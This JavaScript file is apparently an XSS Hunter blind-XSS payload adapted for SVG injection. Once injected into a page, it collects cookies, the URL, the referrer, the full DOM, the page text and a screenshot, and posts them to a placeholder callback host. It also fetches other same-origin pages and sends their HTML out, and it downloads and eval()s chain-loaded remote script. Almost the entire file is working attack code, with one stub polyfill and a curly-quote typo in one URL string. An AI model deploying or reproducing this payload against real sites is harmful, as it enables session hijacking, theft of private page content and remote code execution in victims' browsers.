/*
 XSS Hunter payload adapted for import() usage in SVG payloads.
 Uses [HOST_URL] placeholder for dynamic server URL replacement.
*/

/* FormData/polyfill and utility functions (from original) */
if (typeof Blob !== "undefined" && (typeof FormData === "undefined" || !FormData.prototype.keys)) {
  // FormData polyfill (abbreviated for clarity)
  // Full polyfill logic goes here; you can reuse your existing payload polyfill code.
  // For brevity here, assume it's included as in your original payload.
}

// Include base64_to_blob from original payload (needed for screenshot upload)

function base64_to_blob(base64Data, contentType) {
  contentType = contentType || "";
  var sliceSize = 1024;
  var byteCharacters = atob(base64Data);
  var bytesLength = byteCharacters.length;
  var slicesCount = Math.ceil(bytesLength / sliceSize);
  var byteArrays = new Array(slicesCount);

  for (var sliceIndex = 0; sliceIndex < slicesCount; ++sliceIndex) {
    var begin = sliceIndex * sliceSize;
    var end = Math.min(begin + sliceSize, bytesLength);
    var bytes = new Array(end - begin);
    for (var offset = begin, i = 0; offset < end; ++i, ++offset) {
      bytes[i] = byteCharacters.charCodeAt(offset);
    }
    byteArrays[sliceIndex] = new Uint8Array(bytes);
  }
  return new Blob(byteArrays, { type: contentType });
}

/* Utility to safely get values */

function never_null(value) {
  return value !== undefined ? value : "";
}

/* Data collection for probe */

const probe_return_data = {
  uri: never_null(location.href),
  cookies: never_null(document.cookie),
  referrer: never_null(document.referrer),
  "user-agent": never_null(navigator.userAgent),
  "browser-time": never_null(Date.now().toString()),
  "probe-uid": never_null((function() {
    // GUID generator
    function S4() {
      return (((1 + Math.random()) * 0x10000) | 0).toString(16).substring(1);
    }
    return (S4() + S4() + "-" + S4() + "-" + S4() + "-" + S4() + "-" + S4() + S4() + S4());
  })()),
  origin: never_null(location.origin),
  injection_key: "", // or your dynamic injection key if you use one
  title: document.title,
  text: document.body ? (document.body.innerText || document.body.textContent || "") : "",
  was_iframe: window.top !== window.self ? "true" : "false",
  dom: ""
};

/* Function to send collected page HTML back to server */

function send_collected_page(page_data) {
  var form_data = new FormData();
  Object.keys(page_data).forEach(function(key) {
    form_data.append(key, page_data[key]);
  });

  var http = new XMLHttpRequest();
  http.open("POST", “[HOST_URL]/page_callback”, true);
  http.send(form_data);
}

/* Function to collect page HTML given a list of paths */

var collect_page_list = []; // Will be replaced dynamically from server

function collect_pages() {
  collect_page_list.forEach(function(path) {
    if (path.charAt(0) !== "/") {
      path = "/" + path;
    }
    collect_page_data(path);
  });
}

function collect_page_data(path) {
  try {
    var full_url = location.protocol + "//" + document.domain + path;
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        send_collected_page({ html: xhr.responseText, uri: full_url });
      }
    };
    xhr.open("GET", full_url, true);
    xhr.send(null);
  } catch (e) {
    // Fail silently
  }
}

/* Function to send data and screenshot to js_callback */

function contact_mothership(probe_return_data) {
  var form_data = new FormData();
  Object.keys(probe_return_data).forEach(function(key) {
    if (key === "screenshot") {
      var base64data = probe_return_data[key].replace("data:image/png;base64,", "");
      var blob = base64_to_blob(base64data, "image/png");
      form_data.append("screenshot", blob, "screenshot.png");
    } else {
      form_data.append(key, probe_return_data[key]);
    }
  });

  var http = new XMLHttpRequest();
  http.open("POST", "[HOST_URL]/js_callback", true);
  http.onreadystatechange = function() {
    if (http.readyState === 4 && http.status === 200) {
      // Success callback optional
    }
  };
  http.send(form_data);
}

/* Function to evaluate remote JS source if needed */

function eval_remote_source(uri) {
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function() {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      try {
        eval(xhr.responseText);
      } catch (e) {
        // Swallow errors from eval
      }
    }
  };
  xhr.open("GET", uri, true);
  xhr.send(null);
}

/* Utility to get a textual representation of DOM */

function get_dom_text() {
  var methods = [document.body.outerText, document.body.innerText, document.body.textContent];
  for (var i = 0; i < methods.length; i++) {
    if (typeof methods[i] === "string") return methods[i];
  }
  return "";
}

/* Initialization and execution */

function finishing_moves() {
  contact_mothership(probe_return_data);
  collect_pages();
  if (typeof chainload_uri === "string" && chainload_uri.length > 0) {
    eval_remote_source(chainload_uri);
  }
}

/* chainload_uri and collect_page_list will be replaced server-side */
var chainload_uri = "";
collect_page_list = [];

/* Hook capturing DOM, screenshot, and sending payload */

function hook_load_if_not_ready() {
  try {
    probe_return_data.dom = never_null(document.documentElement.outerHTML);
  } catch (e) {
    probe_return_data.dom = "";
  }

  if (typeof html2canvas === "function") {
    html2canvas(document.body).then(function(canvas) {
      probe_return_data.screenshot = canvas.toDataURL();
      finishing_moves();
    }).catch(function() {
      probe_return_data.screenshot = "";
      finishing_moves();
    });
  } else {
    probe_return_data.screenshot = "";
    finishing_moves();
  }
}

if (document.readyState === "complete") {
  hook_load_if_not_ready();
} else {
  window.addEventListener("load", hook_load_if_not_ready);
}
